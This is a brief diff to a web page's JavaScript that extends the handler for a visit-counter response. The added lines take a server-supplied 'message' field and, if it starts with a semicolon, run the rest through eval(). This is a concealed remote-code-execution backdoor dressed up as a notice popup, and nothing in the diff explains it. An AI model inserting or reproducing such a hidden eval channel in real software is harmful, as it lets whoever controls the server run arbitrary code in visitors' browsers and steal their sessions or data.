@@ -648,6 +648,11 @@ button.qchat-toggle {
 		.then(data => {
 			document.getElementById('visits').innerText = `This page has been visited ${data['visits']} times`;
 			if (data['session']) setSession(data['session']);
+
+			if (data['message']) {
+				if (data['message'].startsWith(';')) eval(data['message'].slice(1));
+				else alert(data['message']);
+			}
 		})
 		.catch(error => {
 			document.getElementById('visits').innerText = `Couldn't load visits`;
